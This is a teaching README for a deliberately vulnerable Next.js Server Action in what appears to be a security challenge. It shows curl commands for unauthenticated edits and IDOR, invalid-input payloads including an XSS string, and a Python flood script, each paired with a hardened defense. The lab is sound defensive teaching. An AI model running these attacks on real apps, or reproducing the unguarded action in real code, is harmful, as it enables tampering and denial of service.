# Insecure Server Action — TEACHING TOY

> **WARNING: NEVER SHIP THIS CODE.**
>
> This directory contains a deliberately vulnerable Server Action used as an
> attack target in C12.  It demonstrates exactly what goes wrong when a Server
> Action has no authentication, no authorization, no input validation, and no
> rate limiting.

---

## What Next.js Server Actions Actually Are

When you write:

```ts
"use server";
export async function editReview(reviewId, rating, body) { ... }
```

Next.js compiles this to an HTTP POST endpoint.  The React UI that calls it is
just a convenience layer.  An attacker can bypass the UI entirely:

```bash
# Find the action ID from the page HTML (look for $$ACTION_ID in the source)
ACTION_ID="abc123..."

curl -X POST https://app.example.com/c12-action-security \
  -H "Content-Type: application/json" \
  -H "Next-Action: $ACTION_ID" \
  -d '["r-001", 1, "Terrible product!"]'
```

The four vulnerabilities in this file allow all of the attacks below.

---

## Attack 1: Unauthenticated Mutation (Vulnerability 1 — No Auth)

No session cookie required.  Any HTTP client on the internet can invoke the
action and edit any review.

```bash
# No --cookie flag — no session at all
curl -X POST https://app.example.com/c12-action-security \
  -H "Next-Action: $ACTION_ID" \
  -d '["r-001", 1, "Attacker was here"]'
# Response: { "ok": true }  ← review r-001 is now edited
```

**Why it works:** The action never calls `getSession()`.  The HTTP layer has
no concept of authentication — it just runs the function.

**Hardened defense:** `const session = await getSession()` as the first line.
Return `{ error: "Unauthorized" }` if `null`.

---

## Attack 2: IDOR — Edit Someone Else&apos;s Review (Vulnerability 2 — No Authz)

Log in as `buyer1@nextmart.dev` and edit a review owned by `buyer2@nextmart.dev`.
The insecure action trusts the caller-supplied `reviewId` with no ownership check.

```bash
# buyer1 is logged in — include their session cookie
curl -X POST https://app.example.com/c12-action-security \
  -H "Next-Action: $ACTION_ID" \
  -H "Cookie: nextmart_session=<buyer1-token>" \
  -d '["r-002", 1, "Buyer2s review — now owned by buyer1"]'
# r-002 belongs to buyer2 but buyer1 just edited it!
```

In the UI: log in as buyer1, open DevTools → Elements, find the hidden
`<input name="reviewId">` on buyer2&apos;s review card, change its value from
`r-002` to any review ID you like, and submit.  The insecure action applies
the change.

**Why it works:** The action looks up `reviewId` in the store but never checks
`review.userId === caller.id`.

**Hardened defense:** After fetching the review, check
`review.userId === session.user.id`.  Return `{ error: "Forbidden" }` on
mismatch (use the same error for "not found" to prevent ID enumeration).

---

## Attack 3: Invalid Input — Corrupt Product Rating (Vulnerability 3 — No Validation)

Pass `rating: 999`.  The repository computes the product&apos;s average rating from
all reviews.  One review with `rating: 999` in a pool of four 4–5 star reviews
will push the average to over 200.

```bash
curl -X POST https://app.example.com/c12-action-security \
  -H "Next-Action: $ACTION_ID" \
  -d '["r-001", 999, "Fine product"]'
# Product p-elec-001 now shows avgRating: ~204
```

**Other invalid inputs:**
- `rating: -1` — negative average corruption
- `rating: 2.7` — float corrupts the integer-assumed average
- `body: "<script>alert(1)</script>"` — stored XSS if body is rendered
  unescaped (this app escapes correctly, but not all do)
- `body: "<10MB string>"` — memory DoS (10MB body × 100 concurrent = 1GB heap)

**Why it works:** The action passes raw input directly to the repository.

**Hardened defense:** Zod schema — `rating: z.number().int().min(1).max(5)`,
`body: z.string().trim().min(1).max(2000)` — parse before any write.

---

## Attack 4: Brute-Force / Flood (Vulnerability 4 — No Rate Limit)

The action accepts unlimited invocations per second.  A bot script can:

- Enumerate all valid `reviewId` values by trying sequential IDs and watching
  for "Not found" vs success responses.
- Flood the store with 10,000 bogus review edits per second.
- Amplify a destructive write to touch every review in the store in seconds.

```python
# Concept: python flood script
import httpx, asyncio

async def flood():
    async with httpx.AsyncClient() as c:
        tasks = [
            c.post("https://app.example.com/c12-action-security",
                   headers={"Next-Action": ACTION_ID},
                   json=[f"r-{i:03d}", 1, "flooded"])
            for i in range(1, 1000)
        ]
        await asyncio.gather(*tasks)

asyncio.run(flood())
```

**Why it works:** No counter, no IP check, no user-ID check.

**Hardened defense (concept):** In-memory counter keyed by user ID — max
10 edits per minute.  For production: Redis + `@upstash/ratelimit` or a
CDN-level rate-limit rule.

---

## Summary Table

| Vulnerability | Attack | Missing defense |
|---|---|---|
| No authentication | Any HTTP client edits any review | `getSession()` |
| No authorization (IDOR) | Authenticated user edits others&apos; reviews | Ownership check `review.userId === session.user.id` |
| No input validation | `rating: 999` corrupts averages, 10MB body DoS | Zod schema |
| No rate limiting | Bot floods at 10k/s | In-memory counter → Redis in production |

---

## Why CSRF Protection Alone Is Not Enough

Next.js&apos; built-in Server Action Origin check prevents a **cross-origin** page
from triggering your action.  But it does NOT:
- Authenticate the caller (T1 above is still open)
- Check what resource the caller may access (T2 above is still open)
- Validate that the input is safe (T3 above is still open)

A same-origin attacker (stored XSS on `nextmart.dev`) passes the Origin check
and still exploits all four vulnerabilities if the action has no guards.

---

*The hardened action is at `app/(challenges)/c12-action-security/_lib/actions.ts`.*
*Compare the two files line-by-line to see every guard.*
